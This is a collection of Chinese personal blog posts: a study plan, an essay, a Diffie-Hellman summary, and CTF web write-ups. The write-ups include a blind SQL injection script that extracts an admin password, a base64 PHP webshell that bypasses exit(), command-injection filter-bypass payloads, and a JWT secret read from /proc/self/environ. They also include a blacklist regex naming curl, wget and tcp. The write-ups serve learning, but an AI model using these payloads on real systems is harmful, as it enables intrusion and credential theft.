[{"content":"Readme 感觉用了大量的时间做计划……好吧，既然是持续近1月的“政策”，花一天时间来拟定也无妨，本文处于随时更新状态。\n这学期最难学分最高的课程已经考完，剩余课程比较平均，权重大致相同，没有重点，全是重点。\n优点是有一整周的无课复习时间，考试时间间距也比较大，并无特别困难的科目，复习资料均充足，总而言之希望能取得好成绩。\n期末考试时间    序号 课程名称 考试时间 学分     1 数字逻辑电路与系统设计 2022-01-04 09:00~10:40 3   2 马克思主义基本原理 2022-01-05 08:00~09:00 3   3 离散数学 2022-01-05 15:20~17:00 3   4 国际交流英语III 2022-01-07 09:00~10:40 2   5 大学物理B(下) 2022-01-07 15:20~17:00 3   6 概率统计A1 2022-01-11 15:20~17:00 3    复习时间 17周12月20日-12月26日课程极少，几乎可忽略不计。18周12月27日-1月3日有8天无课，19周周二考试，20周周二考完最后一门，其中1月8日-1月11日3天无考试。\n时间极充裕。\n复习计划 各科复习内容 数字逻辑电路与系统设计  课后练习题 往年期末题 利用proteus进行组合逻辑/时序逻辑电路设计  马克思主义基本原理（机考）  背，就硬背 攒复习资料，各种机考试题 找方法 看题库，酌情背课后习题  离散数学  课后习题  国际交流英语  看大学生学术英语课本  大学物理  重新打印习题册 重点练习电磁学部分习题  概率统计  课后习题 期末考试题  复习计划表（updating）  2021年12月15日计划     序号 时间 任务     1 15:00-16:20 拟定本计划   2 18:00-19:20 学习数电时序逻辑电路设计和计数器   3 21:20-23:30 英语六级复习题 背单词     2021年12月16日计划     序号 时间 任务     1 11:30-12:30 报告(failed)   2 17:25-18:10 听英语六级听力   3 16:00-17:30 概率论网课(cancelled)   4 18:40-20:00 一套英语六级题   5 20:00-20:40 英语图表作文   6 20:40-21:40 概率论网课   7 21:50-22:10 回顾两张试卷   8 22:10-22:30 马原笔记     2021年12月18日计划     序号 时间 任务     1 下午 英语六级考试     2021年12月19日计划 - 面向下周课程复习     序号 时间 任务     1 9:20-11:20 概率论网课 学到大数定律   2 15:00-17:30 离散数学网课-图、树   3 18:30-20:30 做概率论课后习题 二维随机变量（×）   4 20:30~ 跑步 刷鞋 早点休息     2021年12月21日计划     序号 时间 任务     1 9:50-11:20 概率论网课-看到样本及抽样分布   2 15:00-17:00 离散数学网课   3 22:00-23:30 复习大物实验     2021年12月22日计划     序号 时间 任务     1 上午 自学大物量子力学+课本例题   2 15:00-17:00 数电前三章网课（未来要以课后习题为主）   3 18:00-19:10 数电前三章习题（讲义上的）   4 21:20-22:20 离散数学网课-看到树   5 22:20-23:30 概率论讲义习题    这个周（到12月26日）结束四门课程一轮复习，下周还要加上对英语和马原的复习。 进度如下：\n 数电： 已概览 大物： 还剩量子力学、电磁感应，光学部分不熟，电磁学部分忘的差不多了，欠做题 离散： 还剩集合论和图论 概率： 还剩数理统计部分  复习情况排序：概率\u0026gt;数电\u0026gt;离散\u0026gt;大物\n","permalink":"https://shenyimings.github.io/post/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92/","summary":"Readme 感觉用了大量的时间做计划……好吧，既然是持续近1月的“政策”，花一天时间来拟定也无妨，本文处于随时更新状态。\n这学期最难学分最高的课程已经考完，剩余课程比较平均，权重大致相同，没有重点，全是重点。\n优点是有一整周的无课复习时间，考试时间间距也比较大，并无特别困难的科目，复习资料均充足，总而言之希望能取得好成绩。\n期末考试时间    序号 课程名称 考试时间 学分     1 数字逻辑电路与系统设计 2022-01-04 09:00~10:40 3   2 马克思主义基本原理 2022-01-05 08:00~09:00 3   3 离散数学 2022-01-05 15:20~17:00 3   4 国际交流英语III 2022-01-07 09:00~10:40 2   5 大学物理B(下) 2022-01-07 15:20~17:00 3   6 概率统计A1 2022-01-11 15:20~17:00 3    复习时间 17周12月20日-12月26日课程极少，几乎可忽略不计。18周12月27日-1月3日有8天无课，19周周二考试，20周周二考完最后一门，其中1月8日-1月11日3天无考试。\n时间极充裕。\n复习计划 各科复习内容 数字逻辑电路与系统设计  课后练习题 往年期末题 利用proteus进行组合逻辑/时序逻辑电路设计  马克思主义基本原理（机考）  背，就硬背 攒复习资料，各种机考试题 找方法 看题库，酌情背课后习题  离散数学  课后习题  国际交流英语  看大学生学术英语课本  大学物理  重新打印习题册 重点练习电磁学部分习题  概率统计  课后习题 期末考试题  复习计划表（updating）  2021年12月15日计划     序号 时间 任务     1 15:00-16:20 拟定本计划   2 18:00-19:20 学习数电时序逻辑电路设计和计数器   3 21:20-23:30 英语六级复习题 背单词     2021年12月16日计划     序号 时间 任务     1 11:30-12:30 报告(failed)   2 17:25-18:10 听英语六级听力   3 16:00-17:30 概率论网课(cancelled)   4 18:40-20:00 一套英语六级题   5 20:00-20:40 英语图表作文   6 20:40-21:40 概率论网课   7 21:50-22:10 回顾两张试卷   8 22:10-22:30 马原笔记     2021年12月18日计划     序号 时间 任务     1 下午 英语六级考试     2021年12月19日计划 - 面向下周课程复习     序号 时间 任务     1 9:20-11:20 概率论网课 学到大数定律   2 15:00-17:30 离散数学网课-图、树   3 18:30-20:30 做概率论课后习题 二维随机变量（×）   4 20:30~ 跑步 刷鞋 早点休息     2021年12月21日计划     序号 时间 任务     1 9:50-11:20 概率论网课-看到样本及抽样分布   2 15:00-17:00 离散数学网课   3 22:00-23:30 复习大物实验     2021年12月22日计划     序号 时间 任务     1 上午 自学大物量子力学+课本例题   2 15:00-17:00 数电前三章网课（未来要以课后习题为主）   3 18:00-19:10 数电前三章习题（讲义上的）   4 21:20-22:20 离散数学网课-看到树   5 22:20-23:30 概率论讲义习题    这个周（到12月26日）结束四门课程一轮复习，下周还要加上对英语和马原的复习。 进度如下：","title":"📌2021-2022-1 期末复习计划"},{"content":"Yiming Shen A crappy photographer, a terrible CTFer, a lazy geek.\nA photography lover, a CTF learner, a geek spirit follower.\n","permalink":"https://shenyimings.github.io/about/","summary":"Yiming Shen A crappy photographer, a terrible CTFer, a lazy geek.\nA photography lover, a CTF learner, a geek spirit follower.","title":"关于"},{"content":"昨天晚上罕见的早睡，在床上困意十足地同生物钟作斗争时，不幸的想起了纠结的一些事情：要不要给台式机换个机箱？继续换itx A4机箱，还是换一个开放式机箱？再换itx有必要吗？换开放式机箱能装好/带走吗？……诸如此类。\n我现在的台式机有点问题，若受到颠簸后会电平不稳，开机不亮屏，反复自启至无法开机，放置至少一天半天后才可恢复，这种问题如此奇葩以至于网上甚至少有相关问题。或许是它不适应海南潮湿的天气，或许是全铝合金的机箱接地漏电，当然，更或许是我当初装机时少拧了一个位置妖娆的电源螺丝……即使后来痛苦地补上了，但是损害已经造成，长期的漏电导致我本就不靠谱的RX580 2048sp显卡和450w sfx电源产生了或多或少的损害，现在的电脑之于我已经是一尊大爷，每次只能请他帮我一点微不足道的小忙。\n睡前也是一段贤者时间，我再一次开始反省自己的过往。2020年暑假，我帮一位同学组装他的新电脑时（我只是在旁边起一个Readme.md的作用）主板某处螺丝孔位不对，我和他起了一点争执，我以我多年装机经验认为把有洞的螺丝拧上起个固定作用即可，没有必要全部拧上，他则认为应当精益求精，注重细节，坚持把主板拆下来重新布局铜柱。当然，他是对的，我多年的、不注重细节的装机经验，只是现在在我入睡前折磨着我。\n不仅仅如此。\n20年也是我高考的日子，一直让我耿耿于怀的30分，让我从末流985到末流211的30分。我现在可以以过来人的身份说高考不那么重要，未来还他妈有很多很多的机会……是啊，可是这个机会失去了，那个疫情在家期间每天拼命学习，模拟考真的弯道超车的我的努力付诸东流了，这和我磕磕绊绊的电脑一样，也是因为没有细节。\n一年过去了，当我的女朋友告诉我她是因为我对细节的注重才注意到我时，我却觉得是莫大的讽刺。那也许只是我对细枝末节强迫症般的追求和蹩脚的脑细胞进程调度产生的错觉，我并没有真正做到注重细节，骨子里还是一个粗心大意丢三落四的人。\n这篇文章似乎并不该被我传到博客里，写完才发现这些其实应该是我日记里写的东西……\n是啊，我还有个日记本，插在我的书架里。\n","permalink":"https://shenyimings.github.io/post/%E6%9C%89%E5%85%B3%E7%BB%86%E8%8A%82/","summary":"昨天晚上罕见的早睡，在床上困意十足地同生物钟作斗争时，不幸的想起了纠结的一些事情：要不要给台式机换个机箱？继续换itx A4机箱，还是换一个开放式机箱？再换itx有必要吗？换开放式机箱能装好/带走吗？……诸如此类。\n我现在的台式机有点问题，若受到颠簸后会电平不稳，开机不亮屏，反复自启至无法开机，放置至少一天半天后才可恢复，这种问题如此奇葩以至于网上甚至少有相关问题。或许是它不适应海南潮湿的天气，或许是全铝合金的机箱接地漏电，当然，更或许是我当初装机时少拧了一个位置妖娆的电源螺丝……即使后来痛苦地补上了，但是损害已经造成，长期的漏电导致我本就不靠谱的RX580 2048sp显卡和450w sfx电源产生了或多或少的损害，现在的电脑之于我已经是一尊大爷，每次只能请他帮我一点微不足道的小忙。\n睡前也是一段贤者时间，我再一次开始反省自己的过往。2020年暑假，我帮一位同学组装他的新电脑时（我只是在旁边起一个Readme.md的作用）主板某处螺丝孔位不对，我和他起了一点争执，我以我多年装机经验认为把有洞的螺丝拧上起个固定作用即可，没有必要全部拧上，他则认为应当精益求精，注重细节，坚持把主板拆下来重新布局铜柱。当然，他是对的，我多年的、不注重细节的装机经验，只是现在在我入睡前折磨着我。\n不仅仅如此。\n20年也是我高考的日子，一直让我耿耿于怀的30分，让我从末流985到末流211的30分。我现在可以以过来人的身份说高考不那么重要，未来还他妈有很多很多的机会……是啊，可是这个机会失去了，那个疫情在家期间每天拼命学习，模拟考真的弯道超车的我的努力付诸东流了，这和我磕磕绊绊的电脑一样，也是因为没有细节。\n一年过去了，当我的女朋友告诉我她是因为我对细节的注重才注意到我时，我却觉得是莫大的讽刺。那也许只是我对细枝末节强迫症般的追求和蹩脚的脑细胞进程调度产生的错觉，我并没有真正做到注重细节，骨子里还是一个粗心大意丢三落四的人。\n这篇文章似乎并不该被我传到博客里，写完才发现这些其实应该是我日记里写的东西……\n是啊，我还有个日记本，插在我的书架里。","title":"有关细节✒️"},{"content":"CONTEXT ​\tThe first general purpose computers were built in the 1940s. They were large, filling big rooms, using hundreds of valves and consuming many kilowatts of electricity. Although they were considered amazing for the ability to execute thousands of instructions per second at that time, all these huge machines were rapidly became history and might have been lost in the mists of time. With the increasing speed of computing, networks of computers were established allowing people to have access to communicate with others in distant places. And, so the network information security became an issue from then on.\nPURPOSE ​\tA situation is that X and Y wish to communicate with each other and they want to be sure that their messages shouldn\u0026rsquo;t be intelligible to any other listener. Of course, they need to build a encryption system which they must assume is known to others, requires the use of one or more keys to transmit and decipher their messages. But how can X and Y tell each other their keys without exploiting them.\nMETHODS ​\tAn elegant solution to the key exchange problem was proposed by Diffie and Hellman in 1976. Their method is implemented by X and Y as follows:\n  X and Y uses two integers p, a large prime and m lies between 1 and (p-1), both of them are public.\n  X chooses a secret number $x$ and Y chooses $y$. Both $x$ and $y$ lie between 1 and (p-1). X and Y do not reveal $x$ and $y$ to each other and anyone else.\n  X and Y computes the number\n    $$ k_x = m^x (mod\\quad p)\\\\ k_y = m^y (mod\\quad p) $$\n Now\n$$ (k_x)^y = (k_y)^x \\equiv m^{xy}(mod\\quad p)=K(say) $$\nK is the common key which both X an Y can use for encryption.\n  RESULTS ​\tWe got a public key for the next encryption, but how secure is the Diffie-Hellman system? The security depends upon how difficult it would be for the third party to obtain the value $x$. This is known to be an extremely difficult problem as \u0026lsquo;the discrete logarithm problem\u0026rsquo;. In general it can be considered impossible unless the prime, p, is of a special form.\nDISCUSSION ​\tHowever, an alternative attack which the third party Z could employ by retaining the values of $$k_x$$ and $$k_y$$ and substituting a value of his own, then send it to both X and Y. Z would then re-encrypt the messages using his keys.\n​\tDespite this potential weakness the Diffie-Hellman system has, it can be used as the starting point for other new systems such as DES and RSA in particular.\n","permalink":"https://shenyimings.github.io/post/public-key-cryptography/","summary":"CONTEXT ​\tThe first general purpose computers were built in the 1940s. They were large, filling big rooms, using hundreds of valves and consuming many kilowatts of electricity. Although they were considered amazing for the ability to execute thousands of instructions per second at that time, all these huge machines were rapidly became history and might have been lost in the mists of time. With the increasing speed of computing, networks of computers were established allowing people to have access to communicate with others in distant places.","title":"Public Key Cryptology"},{"content":"题目网址：sql注入\n一个很正经的界面，有实战那味了。\n上来先尝试经典组合：\nadmin~password\n很幸运，用户名猜中了。\n利用单引号检测是否存在SQL注入\nadmin' or 1 = 1\n报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：\n'\ror\r\u0026lt;\u0026gt;(不等号)\r#\r()\r空格可用括号代替，等号可用相反的不等号\n先尝试是否存在布尔注入：\n成功，用户名存在注入~\n之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）\nselect password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload\n1\u0026#39;or((ascii(mid((select(password)from(admin))from(1))))\u0026lt;\u0026gt;9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难\n我们尝试下集束炸弹，让两个参数都作为目标\n第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码\n爆破成功了。。。\n接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：\n4dcc88f8f1bc05e7c2ad1a60288481a2\n去md5破解站破解一下，成功解出密码：\nbugkuctf\n结束了……\n反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。\n贴一组大神的python自动脚本，以供学习\n#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = \u0026#39;http://114.67.246.176:19665/\u0026#39; sss = string.digits + (string.ascii_lowercase) a = \u0026#39;\u0026#39; for i in range(1, 50): flag = 0 for j in sss: payload = \u0026#34;admin\u0026#39;^((ascii(mid((select(password)from(admin))from(%s))))\u0026lt;\u0026gt;%s)^1#\u0026#34; % (i, ord(j)) #屏蔽了\u0026#34;,\u0026#34;，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #\u0026lt;\u0026gt;表示不等号 #^表示异或 payload2= \u0026#34;admin123\u0026#39;or((ascii(mid((select(password)from(admin))from(%s))))\u0026lt;\u0026gt;%s)#\u0026#34;%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= \u0026#34;admin123\u0026#39;or((ascii(mid((select(database()))from(%s))))\u0026lt;\u0026gt;%s)#\u0026#34;%(i,ord(j)) data = {\u0026#39;username\u0026#39;: payload, \u0026#39;password\u0026#39;: \u0026#39;admin\u0026#39;} res = requests.post(url, data=data).text if \u0026#39;username does not exist!\u0026#39; in res: a += j flag = 1 print(a) break if flag == 0: break print(a) 参考题解 [1] Bugku_sqli write up\n","permalink":"https://shenyimings.github.io/post/15.bugku-sql%E6%B3%A8%E5%85%A5/","summary":"题目网址：sql注入\n一个很正经的界面，有实战那味了。\n上来先尝试经典组合：\nadmin~password\n很幸运，用户名猜中了。\n利用单引号检测是否存在SQL注入\nadmin' or 1 = 1\n报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：\n'\ror\r\u0026lt;\u0026gt;(不等号)\r#\r()\r空格可用括号代替，等号可用相反的不等号\n先尝试是否存在布尔注入：\n成功，用户名存在注入~\n之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）\nselect password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload\n1\u0026#39;or((ascii(mid((select(password)from(admin))from(1))))\u0026lt;\u0026gt;9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难\n我们尝试下集束炸弹，让两个参数都作为目标\n第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码\n爆破成功了。。。\n接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：\n4dcc88f8f1bc05e7c2ad1a60288481a2\n去md5破解站破解一下，成功解出密码：\nbugkuctf\n结束了……\n反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。\n贴一组大神的python自动脚本，以供学习\n#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = \u0026#39;http://114.67.246.176:19665/\u0026#39; sss = string.digits + (string.ascii_lowercase) a = \u0026#39;\u0026#39; for i in range(1, 50): flag = 0 for j in sss: payload = \u0026#34;admin\u0026#39;^((ascii(mid((select(password)from(admin))from(%s))))\u0026lt;\u0026gt;%s)^1#\u0026#34; % (i, ord(j)) #屏蔽了\u0026#34;,\u0026#34;，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #\u0026lt;\u0026gt;表示不等号 #^表示异或 payload2= \u0026#34;admin123\u0026#39;or((ascii(mid((select(password)from(admin))from(%s))))\u0026lt;\u0026gt;%s)#\u0026#34;%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= \u0026#34;admin123\u0026#39;or((ascii(mid((select(database()))from(%s))))\u0026lt;\u0026gt;%s)#\u0026#34;%(i,ord(j)) data = {\u0026#39;username\u0026#39;: payload, \u0026#39;password\u0026#39;: \u0026#39;admin\u0026#39;} res = requests.","title":"Bugku-SQL注入-WriteUP"},{"content":"前言 躺在床上，不想动鼠标，那就先写写前言吧。\n这个CTF比赛是我打的第二场比较正规、完整的比赛。\n惨不忍睹，当然，作为刚入门的noob来说也可以接受。\n希望能通过笔记的整理消化新掌握的知识，道阻且长。\n[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。\n关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.\npython2 .\\GitHack.py http:\\\\x.x.x\\.git 运行后即得到git目录。\nGit版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。\ngit log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。\n其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。\n[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。\n第一反应是绕过和注入咯，尝试后无果。\n再观察续一秒按钮前端代码，发现是安慰剂按钮。。。\n那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：\nimport requests import re # 正则表达式库 import string from requests.sessions import session url = \u0026#39;http://81.68.109.40:30005/\u0026#39; session = requests.session() # 保持会话 req = session.get(url=url) # 导入URL，创建会话，结果存储在req中 prog = re.compile(\u0026#39;\\d{8}\u0026#39;) # 初始化正则表达式为匹配连续出现8次的数字 group = prog.findall(req.text) # 将结果存入数组 sum = int (group[0])*int(group[1]) # 计算结果 str=str(sum) data={ \u0026#39;res\u0026#39;:str } # 构建post的payload r=session.post(url=url,data=data) # 发送post请求，返回内容存入r中 print(r.text) 这又是一个利用python做题的重要例子，对于python的学习应用要加强，应当抽时间写爬虫实战以练习。\n[😮Mid]太极掌门人 网页给出代码如下：\n\u0026lt;?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir != \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $dir != \u0026#39;..\u0026#39;) { $sonDir = $path.\u0026#39;/\u0026#39;.$dir; if (is_dir($sonDir)) { deleteDir($sonDir); @rmdir($sonDir); } elseif ($sonDir !== \u0026#39;./index.php\u0026#39; \u0026amp;\u0026amp; $sonDir !== \u0026#39;./flag.php\u0026#39;) { @unlink($sonDir); } } } @rmdir($path); } } $devil = \u0026#39;\u0026lt;?php exit;?\u0026gt;\u0026#39;; $goods = $_POST[\u0026#39;goods\u0026#39;]; file_put_contents($_POST[\u0026#39;train\u0026#39;], $devil . $goods); sleep(1); deleteDir(\u0026#39;.\u0026#39;); ?\u0026gt;关键代码：file_put_contents写入文件，妥妥的文件上传漏洞。\n我们构造命令以绕过exit函数，具体参考13.RCE专栏。\n?train=php://filter/convert.base64-decode/resource=1.php\u0026amp;goods=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== 此时PHP执行的命令为：\nfile_put_contents(\u0026#34;php://filter/convert.base64-decode/resource=1.php\u0026#34;, \u0026#39;\u0026lt;?php exit;?\u0026gt;\u0026#39;.\u0026#34;aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==\u0026#34;); 我们在PHP中运行一下，发现成功在目录下写入了有命令执行的PHP脚本。\n由于这是一个静态靶机，为了减轻服务器负担，故而有删除目录命令的存在，定时清空网站根目录，因此我们要在清空之前连入shell脚本，读取flag.php文件内容，拿到flag。\n[😮Mid]BlackPage 查看源代码，发现hint：查看myblackdoor.php\n\u0026lt;?php error_reporting(0); function blacklist($cmd){ $filter = \u0026#34;(\\\\\u0026lt;|\\\\\u0026gt;|Fl4g|php|curl| |0x|\\\\\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\\\$\\\\{IFS\\\\}|index|\\\\*)\u0026#34;; if (preg_match(\u0026#34;/\u0026#34;.$filter.\u0026#34;/is\u0026#34;,$cmd)==1){ exit(\u0026#39;Go out! This black page does not belong to you!\u0026#39;); } else{ system($cmd); } } blacklist($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;[😮Mid]To_be_Admin 页面左下角有/read字样，打开后提示用get参数传入file即可读取指定文件：\n![image-20211022101753988](14.CNSS Recruit-Web Write UP.assets/image-20211022101753988.png)\n尝试后，未发现注入点，直接读取flag.php显示禁止访问，未找到过滤方法。\n我们用burp抓包后发现，网站的cookie可以被读取查看：\n应用base64解码后发现文本可读，搜索JWT发现这是一种验证算法。\n Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。\n 在JWT.io中可以对其进行详细编辑。jwt分为三部分，头部(header)，载荷(payload)，签名(signature)，签名是根据头部和载荷，加上密钥(key)后按照指定算法生成，如此JWT使用HS256算法。\n在不知道密钥的情况下，我们可以使用JWT cracker暴力破解，我使用java版cracker CPU占用率100%跑了一中午并未出结果，毕竟几率渺茫。\n正确方法应当是找到网站中隐藏的key。\n我们了解一下proc文件系统：\n 通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。\n 由于此网站后端是用python写的，在生成token时调用的密钥必然存在系统中，我们要做的就是找到并查看系统环境变量：\n?file=/proc/self/environ # prco是进程目录（linux进程以文件形式存放），self是当前运行进程，environ是环境变量 ![image-20211022110601481](14.CNSS Recruit-Web Write UP.assets/image-20211022110601481.png)\n在第一行发现密钥KEY：nWMfdan2349r*fn9dMz\n这……怎么可能暴力碰出来呢。\n进入jwt.io，修改username=admin，用该密钥生成新的jwt，传入token，放包\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkFkbWluIn0.1kMTURzATts34snMro5E2MvNRM46lY0S1Ez4iSmp2_s\r拿到flag。\n参考 [1] 正则表达式语法-RUNNOOB\n[2] Git恢复本地被误删文件\n[3] Proc文件系统详解\n","permalink":"https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/","summary":"前言 躺在床上，不想动鼠标，那就先写写前言吧。\n这个CTF比赛是我打的第二场比较正规、完整的比赛。\n惨不忍睹，当然，作为刚入门的noob来说也可以接受。\n希望能通过笔记的整理消化新掌握的知识，道阻且长。\n[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。\n关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.\npython2 .\\GitHack.py http:\\\\x.x.x\\.git 运行后即得到git目录。\nGit版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。\ngit log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。\n其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。\n[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。\n第一反应是绕过和注入咯，尝试后无果。\n再观察续一秒按钮前端代码，发现是安慰剂按钮。。。\n那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：\nimport requests import re # 正则表达式库 import string from requests.sessions import session url = \u0026#39;http://81.68.109.40:30005/\u0026#39; session = requests.","title":"CNSS Recruit-Web Write UP"},{"content":"本文以CTF-show Web入门29-41题作为例题，学习RCE相关知识。\nWeb 29 过滤了flag字样\n?c=system(\u0026quot;cat f*\u0026quot;);\rWeb 30 过滤了flag|system|php三个关键字，flag和php是待执行命令文本， 可以通过引号、斜杠或反斜杠绕过\necho `cat f\\lag.ph\\p`; 反引号可以执行系统命令\nWeb 31 在cat被禁时，我们还可以采用如下命令\n 1.tac：从最后一行开始显示，是cat的反向显示 2.more：一页一页的显示档案内容 3.less：与more类似 4.head：查看文档的前几行 5.tail：查看文档的后几行 6.nl：显示的时候，顺便输入行号 7.od：以二进制的方式读取档案内容 8.vi：一种编辑器 9.uniq：查看 10.vim：一种编译器\n 空格的代替符号：\n 1.${IFS}\r2.$IFS$1\r3.${IFS\r4.%20\r5.\u0026lt;和\u0026lt;\u0026gt;重定向符\r6.%09\r 构造本题payload\n?c=echo\u0026#39;more%09f*\u0026#39;;  其他题解：\n?c=eval($_GET[1]);\u0026amp;1=system(\u0026#39;cat flag.php\u0026#39;);嵌套脱离了c的正则判断 ?c=echo`strings%09f*`; ?c=\u0026#34;\\x73\\x79\\x73\\x74\\x65\\x6d\u0026#34;(\u0026#34;nl%09fl[a]*\u0026#34;);等价于system()。这个学到了！  Web 32 屏蔽了echo\n分号可以用?\u0026gt;代替，括号可以用“”绕过，利用文件包含的方式查看flag.php，注意要先进行base64转码以绕过关键词过滤。\n?c=include\u0026#34;$_GET[1]\u0026#34;?\u0026gt;\u0026amp;1=php://filter/read=convert.base64- encode/resource=flag.php 绕过死亡EXIT - CNSS 太极掌门人 \u0026lt;?php $filename=$_GET[\u0026#39;filename\u0026#39;]; $content=$_GET[\u0026#39;content\u0026#39;]; file_put_contents($filename,\u0026#34;\u0026lt;?php exit();\u0026#34;.$content); 两个参数变量间用exit()方法隔开，即使注入一句话也无法执行，如何绕过这个“死亡exit”？\n我们只需要将content前面部分内容使用某种手段(如编码)进行处理，导致PHP不能识别该部分即可。\nbase64绕过 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。\n?filename=php://filter/convert.base64-decode/resource=1.php\u0026amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== [😮Mid]太极掌门人 \u0026lt;?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir != \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $dir != \u0026#39;..\u0026#39;) { $sonDir = $path.\u0026#39;/\u0026#39;.$dir; if (is_dir($sonDir)) { deleteDir($sonDir); @rmdir($sonDir); } elseif ($sonDir !== \u0026#39;./index.php\u0026#39; \u0026amp;\u0026amp; $sonDir !== \u0026#39;./flag.php\u0026#39;) { @unlink($sonDir); } } } @rmdir($path); } } $devil = \u0026#39;\u0026lt;?php exit;?\u0026gt;\u0026#39;; $goods = $_POST[\u0026#39;goods\u0026#39;]; file_put_contents($_POST[\u0026#39;train\u0026#39;], $devil . $goods); sleep(1); deleteDir(\u0026#39;.\u0026#39;); ?\u0026gt;网页给出代码如上。\n关键代码：file_put_contents写入文件，妥妥的文件上传漏洞。\n?train=php://filter/convert.base64-decode/resource=1.php\u0026amp;goods=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== 此时PHP执行的命令为：\nfile_put_contents(\u0026#34;php://filter/convert.base64-decode/resource=1.php\u0026#34;, \u0026#39;\u0026lt;?php exit;?\u0026gt;\u0026#39;.\u0026#34;aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==\u0026#34;); 